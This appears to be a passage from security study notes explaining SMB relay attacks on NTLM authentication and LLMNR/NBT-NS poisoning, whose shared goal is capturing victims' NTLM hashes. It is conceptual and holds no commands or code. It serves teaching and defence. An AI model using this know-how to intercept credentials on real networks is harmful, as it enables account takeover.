The SMB Relay attack abuses the NTLM authentication mechanism (NTLM challenge-response protocol). The attacker performs a Man-in-the-Middle attack to monitor and capture SMB packets and extract hashes. For this attack to work, the SMB signing must be disabled. SMB signing is a security check for integrity and ensures the communication is between trusted sources. 

### LLMNR NBNS Poisoning
Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) help local network machines to find the right machine if DNS fails. For example, suppose a machine within the network tries to communicate with no existing DNS record (DNS fails to resolve). In that case, the machine sends multicast messages to all network machines asking for the correct address via LLMNR or NBT-NS.

The NBNS/LLMNR Poisoning occurs when an attacker spoofs an authoritative source on the network and responds to the Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) traffic to the requested host with host identification service.

The end goal for SMB relay and LLMNR/NBNS Poisoning attacks is to capture authentication NTLM hashes for a victim, which helps obtain access to the victim's account or machine. 

